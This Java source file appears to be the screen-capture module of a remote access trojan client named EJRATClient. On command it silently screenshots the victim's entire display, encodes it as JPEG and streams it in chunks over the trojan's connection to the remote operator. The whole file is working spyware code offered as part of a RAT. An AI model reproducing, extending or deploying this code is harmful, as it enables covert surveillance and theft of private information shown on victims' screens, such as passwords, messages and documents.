package ej.ratclient.packet.impl;

import ej.ratclient.EJRATClient;
import ej.ratclient.packet.PacketType;
import ej.ratclient.packet.Packet;
import ej.ratclient.packet.PacketBuilder;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import javax.imageio.ImageIO;

public class PacketImage implements PacketType {

    @Override
    public void handlePacket(Packet packet) {
        Dimension screenDim = Toolkit.getDefaultToolkit().getScreenSize();

        byte bytes[] = null;

        try {
            Robot robot = new Robot();

            BufferedImage image = robot.createScreenCapture(new Rectangle(0, 0,
                    (int) screenDim.getWidth(), (int) screenDim.getHeight()));

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", baos);
            baos.flush();
            bytes = baos.toByteArray();
            baos.close();

        } catch (Exception exception) {
            return;
        }

        int splitBy = 2000;
        int parts = (bytes.length / splitBy);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        for (int i = 0; i < parts; i++) {
            int index = i * splitBy;
            try {
                PacketBuilder builder = new PacketBuilder(3);
                builder.put(1);
                builder.putBytes(bytes, index, index + splitBy);
                EJRATClient.get().out.write(builder.toPacket().getPayload());
                //sbaos.write(bytes, index, index + splitBy);
            } catch (Exception e) {
                e.printStackTrace();;
            }
        }
        try {
            PacketBuilder builder = new PacketBuilder(3);
            EJRATClient.get().out.write(builder.put(2).toPacket().getPayload());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
